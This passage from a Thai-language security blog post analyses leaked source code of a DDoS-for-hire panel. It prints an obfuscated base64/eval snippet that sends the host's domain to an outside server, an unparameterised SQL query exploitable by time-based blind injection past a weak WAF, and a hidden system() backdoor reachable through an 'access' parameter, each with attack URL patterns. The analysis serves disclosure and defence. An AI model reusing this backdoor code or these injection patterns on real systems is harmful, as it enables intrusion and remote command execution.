base64_decode(&#34;ZnVuY3Rpb24gZ2V0UmVhbElwQWRkcigpeyBpZighZW1wdHkoXCRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXSkpeyBcJGlwID0gXCRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXTsgfSBlbHNlaWYoIWVtcHR5KFwkX1NFUlZFUlsnSFRUUF9DTElFTlRfSVAnXSkpIHsgXCRpcCA9IFwkX1NFUlZFUlsnSFRUUF9DTElFTlRfSVAnXTsgfSBlbHNlaWYoIWVtcHR5KFwkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpIHsgXCRpcCA9IFwkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXTsgfSBlbHNlIHsgXCRpcCA9IFwkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsgfSByZXR1cm4gXCRpcDsgfSBcJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPSBnZXRSZWFsSXBBZGRyKCk7IHJlcXVpcmUoJ2Z1bmN0aW9ucy5waHAnKTsgXCR1c2VyID0gbmV3IHVzZXI7IFwkc3RhdHMgPSBuZXcgc3RhdHM7IFwkZGVzaWduID0gbmV3IGRlc2lnbjsgXCRkb21haW49XCRfU0VSVkVSWydTRVJWRVJfTkFNRSddOyBcJHByb2R1Y3Q9XCIzXCI7IFwkbGljZW5zZVNlcnZlciA9IFwiaHR0cHM6Ly93d3cudnBuYmlkLmJpZC9hcGkvXCI7IFwkcG9zdHZhbHVlPVwiZG9tYWluPVwkZG9tYWluJnByb2R1Y3Q9XCIudXJsZW5jb2RlKFwkcHJvZHVjdCk7IFwkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoXCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgY3VybF9zZXRvcHQoXCRjaCwgQ1VSTE9QVF9VUkwsIFwkbGljZW5zZVNlcnZlcik7IGN1cmxfc2V0b3B0KFwkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KFwkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgXCRwb3N0dmFsdWUpOyBcJHJlc3VsdD0ganNvbl9kZWNvZGUoY3VybF9leGVjKFwkY2gpLCB0cnVlKTsgY3VybF9jbG9zZShcJGNoKTsgCgo=&#34;);
+eval(&#34;return eval(\&#34;$code\&#34;);&#34;);
+</code></pre></div><p>การเก็บข้อมูลโดยนำไปผ่านฟังก์ชัน <code>base64_encode()</code> มักเป็นความพยายามพื้นฐานที่ผู้พัฒนาเลือกใช้เพื่อลักลอบฝังซอร์สโค้ดบางอย่างเอาไว้ โค้ดตัวอย่างด้านบนจะมีการเรียกใช้ฟังก์ชัน <code>base64_decode()</code> แล้วนำผลลัพธ์ที่ได้มาเก็บไว้ในตัวแปร <code>$code</code> ก่อนจะมีการเรียกใช้ผ่านฟังก์ชัน <code>eval()</code></p>
+<p>หากเราดูเนื้อหาในตัวแปร <code>$code</code> ก่อนจะผ่านฟังก์ชัน <code>eval()</code> เราจะเห็นโค้ดตามตัวอย่างด้านล่าง (มีการจัดรูปแบบโค้ดใหม่เพื่อให้อ่านได้ง่ายขึ้น)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function getRealIpAddr()
+{
+    if (!empty($_SERVER[&#39;HTTP_CF_CONNECTING_IP&#39;])) {
+        $ip = $_SERVER[&#39;HTTP_CF_CONNECTING_IP&#39;];
+    } elseif (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;])) {
+        $ip = $_SERVER[&#39;HTTP_CLIENT_IP&#39;];
+    } elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
+        $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+    } else {
+        $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+    }
+    return $ip;
+}
+
+$_SERVER[&#39;REMOTE_ADDR&#39;] = getRealIpAddr();
+require(&#39;functions.php&#39;);
+$user = new user;
+$stats = new stats;
+$design = new design;
+
+$domain = $_SERVER[&#39;SERVER_NAME&#39;];
+$product = &#34;3&#34;;
+$licenseServer = &#34;https://www.vpnbid.bid/api/&#34;;
+$postvalue = &#34;domain=$domain<span style="color:#960050;background-color:#1e0010">&amp;</span>product=&#34; . urlencode($product);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_URL, $licenseServer);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postvalue);
+$result = json_decode(curl_exec($ch), true);
+curl_close($ch);
+</code></pre></div><p>โค้ดด้านบนสามารถถูกอธิบายโดยแบ่งออกเป็น 3 ส่วนดังนี้</p>
+<ol>
+<li>ส่วนฟังก์ชัน <code>getRealIpAddr()</code> เป็นฟังก์ชันสำหรับใช้ในการหาหมายเลขไอพีแอดเดสที่มีการเชื่อมต่อมายังเซิร์ฟเวอร์ที่ซอร์สโค้ดนี้ทำงาน</li>
+<li>ส่วนการสร้างออบเจ็กต์ <code>$user</code>, <code>$stats</code> และ <code>$design</code> จากคลาสซึ่งอยู่ในไฟล์ <code>includes/functions.php</code> ลักษระการเรียกใช้งานดูเกี่ยวข้องกับการทำงานโดยทั่วไปของแพลตฟอร์ม</li>
+<li>ส่วนการเก็บข้อมูลตำแหน่งที่อยู่ของเซิร์ฟเวอร์ที่ซอร์สโค้ดนี้ทำงานในตัวแปร <code>$domain</code> และส่งไปยังโดเมนที่ระบุในตัวแปร <code>$licenseServer</code></li>
+</ol>
+<p>ลักษณะซึ่งปรากฎในส่วนที่ 3 นั้นบ่งชี้ให้เห็นว่าเมื่อใดก็ตามที่ชุดซอร์สโค้ดนี้ถูกนำไปใช้งาน โค้ดจะมีการส่งข้อมูลตำแหน่งที่อยู่ของเซิร์ฟเวอร์ที่โฮสต์ซอร์สโค้ดเอาไว้จาก <code>$_SERVER['SERVER_NAME']</code> และส่งไปยัง <code>www.vpnbid.bid/api/</code> เสมอในลักษณะของข้อมูล telemetry ในทางกลับกัน ผู้ซึ่งครอบครองโดเมน <code>vpnbid.bid</code> จะได้รับข้อมูลโดยอัตโนมัติว่ามีใครใช้งานซอร์สโค้ดชุดนี้อยู่บ้าง</p>
+<p>ลักษณะการมีอยู่ของ telemetry เป็นดาบสองคม ในกรณีที่ระบบมีช่องโหว่อยู่ การมีอยู่ของโค้ด telemetry จะทำให้ผู้ที่ได้รับ telemetry data รู้ได้ทันทีว่ามีใครนำซอฟต์แวร์ไปใช้บ้าง และสามารถเลือกโจมตีระบบด้วยช่องโหว่ที่มีอยู่ในระบบได้</p>
+<p>เมื่อตรวจสอบข้อมูลของผู้ถือครองโดเมน <code>vpnbid.bid</code> โดเมนดังกล่าวเคยถูกจดทะเบียนในช่วงวันที่ 24 กันยายน 2017 และมีข้อมูลการใช้งานครั้งสุดท้าย 22 ตุลาคม 2018 ปัจจุบันไม่มีการถือครองโดเมนนี้แล้ว ซึ่งสามารถถูกตีความได้ว่าผู้ไม่ประสงค์สามารถสวมรอยโดยจดทะเบียนและถือครองโดเมน <code>vpnbid.bid</code> เอาไว้และรอข้อมูล telemetry data เพื่อแสวงหาประโยชน์ได้</p>
+<h2 id="authenticated-sql-injection">Authenticated SQL Injection</h2>
+<p>แม้ว่า SQL query โดยส่วนใหญ่ซึ่งปรากฎในชุดซอร์สโค้ดจะมีการใช้ prepared statements และหลีกเลี่ยงการนำ untrusted data จากผู้ใช้งานมาใส่ใน SQL query โดยตรง การอ่านซอร์สโค้ดกลับพบว่ามี SQL query ในบางไฟล์ซึ่งยังคงไม่ได้มีการปฏิบัติตามแนวทางดังกล่าว และเปิดช่องทางให้เกิดการช่องโหว่ในลักษณะของ SQL injection ได้</p>
+<p>ซอร์สโค้ดด้านล่างคือซอร์สโค้ดในไฟล์ <code>ticket.php</code> ซึ่งปรากฎอยู่ที่ตำแหน่ง <code>admin/ticket.php</code> และ <code>staff/ticket.php</code> ด้วยตำแหน่งของไฟล์ การจะเข้าถึงไฟล์ <code>ticket.php</code> ได้นั้น ผู้ใช้งานจะต้องมี rank ในระบบเป็นกลุ่มเจ้าหน้าที่ของระบบ (staff) หรือผู้ดูแลระบบ (admin) ก่อน</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">ob_start</span>();
+<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;../includes/db.php&#39;</span>);
+<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;../includes/init.php&#39;</span>); 
+
+$id <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;id&#39;</span>];
+$SQLGetTickets <span style="color:#f92672">=</span> $odb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * FROM `tickets` WHERE `id` = </span><span style="color:#e6db74">{</span>$_GET[&#39;id&#39;]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+<span style="color:#66d9ef">while</span> ($getInfo <span style="color:#f92672">=</span> $SQLGetTickets<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">FETCH_ASSOC</span>)) {
+	$username <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($getInfo[<span style="color:#e6db74">&#39;username&#39;</span>]);
+	$subject <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($getInfo[<span style="color:#e6db74">&#39;subject&#39;</span>]);
+	$status <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($getInfo[<span style="color:#e6db74">&#39;status&#39;</span>]);
+	$original <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($getInfo[<span style="color:#e6db74">&#39;content&#39;</span>]);
+	$date <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>(<span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;m-d-Y, h:i:s a&#34;</span>, $getInfo[<span style="color:#e6db74">&#39;date&#39;</span>]));
+}
+
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;header.php&#39;</span>;
+$page <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Reply to Ticket&#34;</span>;
+
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>จากซอร์สโค้ดด้านบน เราจะสามารถสังเกตเห็นได้ว่าโค้ดมีการรับพารามิเตอร์ <code>id</code> จาก HTTP GET request มาใส่ไว้ในตัวแปร <code>$id</code> จากนั้นตัวแปรดังกล่าวถูกนำมาใช้ใน SQL query ซึ่งเก็บผลลัพธ์ไว้ในตัวแปร <code>$SQLGetTickets</code> โดยทันที ด้วยลักษณะของโค้ดดังกล่าว เราสามารถโจมตีในลักษณะของ SQL injection โดยการ inject ผ่านพารามิเตอร์ <code>id</code> ในลักษณะ <code>http://&lt;URL&gt;/[admin||staff]/ticket.php?id=[sql]</code></p>
+<p>อย่างไรก็ตามชุดซอร์สโค้ด DDoSaaS ที่เราตรวจสอบอยู่นี้มีการฝังฟังก์ชัน Web application firewall (WAF) สำเร็จรูปเอาไว้ อ้างอิงจากโค้ดในไฟล์ <code>includes/db.php</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+<span style="color:#75715e">// Before of all your CODE.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#39;waf.php&#39;</span>);
+$xWAF <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">xWAF</span>();
+$xWAF<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">start</span>();
+<span style="color:#75715e">// Your code below.
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#f92672">@</span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">strtolower</span>($_SERVER[<span style="color:#e6db74">&#39;SCRIPT_NAME&#39;</span>]),<span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">basename</span>(<span style="color:#66d9ef">__FILE__</span>)))){
+		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Error, Your IP Address Has Been Logged!&#39;</span>);
+	}
+	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>);
+	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;stresser&#39;</span>);
+	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_USERNAME&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span>);
+	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;ERROR_MESSAGE&#39;</span>, <span style="color:#e6db74">&#39;Database error&#39;</span>);
+	
+	<span style="color:#66d9ef">try</span> {
+	$odb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PDO</span>(<span style="color:#e6db74">&#39;mysql:host=&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">DB_HOST</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;;dbname=&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">DB_NAME</span>, <span style="color:#a6e22e">DB_USERNAME</span>, <span style="color:#a6e22e">DB_PASSWORD</span>);
+	$odb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAttribute</span>(<span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ATTR_EMULATE_PREPARES</span>, <span style="color:#66d9ef">false</span>);
+	$odb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAttribute</span>(<span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ATTR_ERRMODE</span>, <span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ERRMODE_EXCEPTION</span>);
+	
+	}<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">PDOException</span> $ex){
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">ERROR_MESSAGE</span>;
+}
+</code></pre></div><p>เฟรมเวิร์คของ WAF ที่มีการใช้งานนั้นถูกระบุว่าเป็นเฟรมเวิร์คจากโครงการ <a href="https://github.com/Alemalakra/xWAF">Alemalakra/xWAF</a> ซึ่งถูกอัปเดตล่าสุดเมื่อ 2 ปีที่ผ่านมาและไม่มีการอัปเดตใด ๆ อีก หากดูในซอร์สโค้ดของฟังก์ชัน <a href="https://github.com/Alemalakra/xWAF/blob/master/xwaf.php#L102"><code>sqlCheck()</code></a> ซึ่งปรากฎในไฟล์ <code>waf.php</code> เราจะพบว่ามาตรการของ xWAF ที่ใช้เพื่อตอบโต้การโจมตีมีเพียงการตรวจสอบ SQL query ในลักษณะ blacklisting เพื่อหาการใช้คำต้องห้าม<a href="https://github.com/Alemalakra/xWAF/blob/master/xwaf.php#L35">ซึ่งถูกกำหนดไว้อย่างไม่ครอบคลุม</a></p>
+<p><img src="https://i.imgur.com/UoopYyO.png#center" alt=""></p>
+<p>ด้วยเงื่อนไขดังกล่าว การโจมตีโดยใช้เทคนิค SQL injection ก็ยังคงเกิดขึ้นได้แม้จะมี WAF มาขวางหน้า โดยอาศัยเทคนิค time-based blind และใช้คำสั่ง SQL อย่าง <code>SLEEP()</code> ที่ไม่ได้อยู่ใน blacklist เนื่องจากผลลัพธ์ของการโจมตีไม่ได้ปรากฎขึ้นมาให้เห็นโดยตรงแต่สามารถถูกตรวจสอบได้จาก side-channel อย่างเช่นเวลาในการประมวลผล</p>
+<h2 id="remote-code-execution-via-backdoor-code">Remote Code Execution via Backdoor Code</h2>
+<p>แม้จะไม่สามารถบอกได้อย่างชัดเจนถึงสาเหตุที่ความเสี่ยงอย่างการส่งข้อมูล telemetry ไปยังระบบอื่นหรือช่องโหว่ SQL injection นั้นเกิดขึ้น ผมกลับค่อนข้างมั่นใจว่าความเสี่ยงต่อไปนี้นั้นมีความตั้งใจที่ชัดเจนให้มันคงอยู่เพื่อใช้ประโยชน์ในลักษณะของช่องทางลับหรือ Backdoor</p>
+<p>ความเสี่ยงนี้ปรากฎอยู่ในไฟล์ <code>h.php</code> ซึ่งทำหน้าที่แสดงส่วน header ของหน้าเว็บไซต์ ด้วยหน้าที่ของไฟล์ <code>h.php</code> ซึ่งจำเป็นต่อการแสดงผล โค้ดในไฟล์ <code>h.php</code> จึงถูกเรียกใช้ผ่านฟังก์ชัน <code>include()</code> จากหลายไฟล์ในชุดซอร์สโค้ด อาทิ <code>boottest.php</code>, <code>dashboard.php</code>, <code>gift.php</code>, <code>news.php</code>, <code>purchase.php</code>, <code>s.php</code>, <code>stress.php</code> และ <code>t.php</code></p>
+<p>โค้ดดังกล่าวมีลักษณะตามตัวอย่างด้านล่าง</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#f92672">head</span>&gt;
+	<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;YWNjZXNz&#39;</span>)])) {
+		<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;PHByZT4=&#39;</span>);
+		$k0 <span style="color:#f92672">=</span> ($_REQUEST[<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;YWNjZXNz&#39;</span>)]);
+		<span style="color:#a6e22e">system</span>($k0);
+		<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;PC9wcmU+&#39;</span>);
+		<span style="color:#66d9ef">die</span>;
+	} <span style="color:#75715e">?&gt;</span> &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.google.com/recaptcha/api.js&#34;</span> <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">defer</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>โค้ดด้านบนจะทำงานก็ต่อเมื่อมีการส่งพารามิเตอร์ซึ่งเมื่อผ่านฟังก์ชัน <code>base64_decode()</code> แล้วได้คำว่า <code>access</code> ถูกกำหนดค่าเอาไว้ โดยหากมีการส่งค่ามาทางพารามิเตอร์ <code>access</code> หน้าเว็บเพจจะแสดงโค้ด HTML <code>&lt;pre&gt;</code> ซึ่งเกิดจากการนำค่า <code>PHByZT4=</code> ไปผ่านฟังก์ชัน <code>base64_decode()</code> และนำข้อมูลที่มากับพารามิเตอร์ <code>access</code> ไปรันในฟังก์ชัน <code>system()</code> ซึ่งเทียบเท่ากับการรันคำสั่งของระบบ</p>
+<p>ด้วยเงื่อนไขของโค้ด Backdoor นี้ ผู้โจมตีสามารถทำ remote code execution โดยใช้เงื่อนไขของโค้ด Backdoor จากหน้าเว็บไซต์ที่มีการโหลดไฟล์ <code>h.php</code> มาใช้ได้ในลักษณะ <code>http://&lt;URL&gt;/[vulnerable_file].php?access=[command]</code></p>
+<p><img src="https://i.imgur.com/oiU8IMw.png#center" alt=""></p>
+<p>จากลักษณะของโค้ดที่ฝังเอาไว้ ความพยายามในใช้ฟังก์ชัน <code>base64_decode()</code> เพื่อการปกปิดและผลกระทบที่เกิดจากโค้ด มีความเป็นไปได้สูงว่ามีผู้ตั้งใจฝังโค้ด Backdoor นี้เอาไว้เพื่อใช้หาประโยชน์จากผู้ที่นำซอร์สโค้ดนี้ไปใช้โดยไม่มีการตรวจสอบ</p>
+<h1 id="final-note">Final Note</h1>
+<p>บริการในกลุ่ม DDoSaaS เป็นบริการซึ่งเกิดใหม่ได้ง่ายตราบเท่าที่ยังมีผู้ใช้งานซึ่งแสวงหาอำนาจในการโจมตีระบบอื่นภายใต้เงื่อนไขของความง่ายเพียงแค่จ่ายเงินและระบุเป้าหมาย เงื่อนไขเหล่านี้เป็นเงื่อนไขหนึ่งซึ่งทำให้การรับมือและตอบสนองต่อการโจมตี DDoS อยู่ที่การเตรียมความพร้อมเพื่อยืนหยัดไว้ให้ได้นานที่สุด และเสีย Availability ให้น้อยที่สุดจากการโจมตี ชัยชนะต่อการรับมือสถานการณ์นี้จะถูกประเมินจากผู้ที่มีทรัพยากรที่มากกว่า หรือมีความพร้อมมากกว่านั่นเอง</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://pandora.sh/posts/facebook-breach-2019/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Facebook Breach 2019</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://pandora.sh/posts/apt-41-indictments/">
+                  <span class="button__text">APT 41 Indictments</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+          <span>
+              <a href="https://webring.wonderful.software#pandora.sh" title="วงแหวนเว็บ" target="_blank" rel="noopener">
+                <img src="/img/webring.svg" width="20px" height="20px" alt="วงแหวนเว็บ" />
+              </a>
+          </span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://pandora.sh/assets/main.js"></script>
+<script src="https://pandora.sh/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
